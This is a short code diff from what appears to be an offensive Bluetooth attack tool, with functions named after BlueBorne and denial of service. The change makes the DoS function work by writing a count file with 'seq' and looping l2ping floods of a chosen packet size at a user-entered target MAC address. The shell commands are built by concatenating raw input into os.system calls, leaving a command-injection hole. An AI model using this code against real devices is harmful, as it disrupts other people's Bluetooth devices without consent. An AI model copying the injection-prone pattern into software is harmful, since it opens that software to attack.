@@ -64,7 +64,8 @@ def blueborne():
 
 def DoS(seq, size):
     mac = input("Write target MAC address: ")
-    subprocess.run(["sudo", "seq", str(seq), ">", "numberofpings"], stdout=subprocess.DEVNULL)
+    ##subprocess.run(["sudo", "seq", str(seq), ">", "numberofpings"], stdout=subprocess.DEVNULL)
+    os.system("sudo seq " + str(seq) + " > numberofpings")
     os.system("while read r; do l2ping -s " + str(size) + " " + mac + "; done < numberofpings")
 
 def jieggi_DoS():
